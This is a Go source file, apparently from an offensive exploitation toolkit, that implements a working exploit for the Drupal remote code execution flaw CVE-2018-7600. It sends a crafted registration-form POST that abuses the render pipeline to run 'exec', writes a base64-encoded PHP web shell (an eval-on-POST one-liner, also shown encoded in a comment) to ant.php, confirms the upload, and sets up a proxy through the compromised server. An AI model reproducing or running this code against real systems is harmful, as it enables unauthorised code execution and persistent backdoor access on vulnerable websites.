package payload

import (
	"bytes"
	"encoding/base64"
	"errors"
	"fmt"
	"net/http"
	"time"

	"github.com/jstang9527/gofor/src/share/proxy"
	"github.com/jstang9527/gofor/src/srv-exploit/files"
)

type CVE_2018_7600 struct {
	target string // "http://127.0.0.1:8080"
	uri    string // "/index.php?page=2&id=2"
	client *http.Client
	stype  files.ShellType
}

func NewCVE_2018_7600(target string) *CVE_2018_7600 {
	return &CVE_2018_7600{
		target: target,
		uri:    `/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`,
		client: &http.Client{Timeout: time.Second * 30},
		stype:  files.PHPWebShell,
	}
}

// 上传webshell(原理参考CVE-2017-10271)
func (r *CVE_2018_7600) Attack() (string, error) {
	// PD9waHAgZXZhbCgkX1BPU1RbYW50XSk7
	content := base64.StdEncoding.EncodeToString([]byte(files.NewWebShell(r.stype).Console()))
	cmd := fmt.Sprintf("echo %v | base64 -d | tee ant.php", content)
	body := "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=" + cmd
	req, err := http.NewRequest("POST", r.target+r.uri, bytes.NewBuffer([]byte(body)))
	if err != nil {
		return "", err
	}
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en")
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)")
	req.Header.Set("Connection", "close")
	req.Header.Set("Content-Length", fmt.Sprint(len(body)))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	// 发送请求
	if _, err := r.client.Do(req); err != nil {
		return "", err
	}

	// 二次确认
	req, _ = http.NewRequest("GET", fmt.Sprintf("%v/ant.php", r.target), nil)
	resp, err := r.client.Do(req)
	if err != nil {
		return "", err
	}
	if resp.StatusCode == 404 {
		return "", errors.New("failed upload file")
	}
	return "/ant.php", nil
}

func (r *CVE_2018_7600) CreateProxy() (string, error) {
	return proxy.NewProxy(proxy.ProxyTypeHTTP, r.target).Run()
}
